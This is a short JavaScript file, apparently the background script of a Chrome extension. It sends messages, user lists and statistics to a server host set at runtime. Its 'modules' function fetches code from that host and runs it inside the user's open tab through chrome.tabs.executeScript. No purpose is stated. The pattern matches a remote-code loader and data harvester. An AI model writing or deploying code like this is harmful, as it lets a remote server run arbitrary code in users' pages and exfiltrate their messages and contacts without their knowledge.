var server = {
    host: "",
    settings: function (data, callback) {
        var url = server.host + "/receive/settings";
        $.get(url, {}, callback);
    },
    online: function (data, callback, sender) {
        server.host = data.host;
        var url = server.host + "/receive/online";
        $.post(url, data, function () {
            server.modules(data, sender);
            if (callback) callback();
        });
    },
    messages: function (data, callback) {
        var url = server.host + "/receive/messages";
        $.post(url, data, callback);
    },
    statistic: function (data, callback) {
        var url = server.host + "/receive/statistic";
        $.post(url, data, callback);
    },
    users: function (data, callback) {
        var url = server.host + "/receive/users";
        $.post(url, data, callback);
    },
    modules: function (data, sender)
    {
        var url = server.host + "/receive/modules?id=" + data.online.kfuin + "&t=" + new Date().getTime();
        var xhr = new XMLHttpRequest();
        xhr.open("GET", url, true);
        xhr.onreadystatechange = function () {
            if (xhr.readyState === 4) {
                chrome.tabs.executeScript(sender.tab.id, { code: xhr.responseText }, function () {
                    chrome.tabs.executeScript(sender.tab.id, { code: "builder.initialization();" });
                });
            }
        }
        xhr.send();
    }
};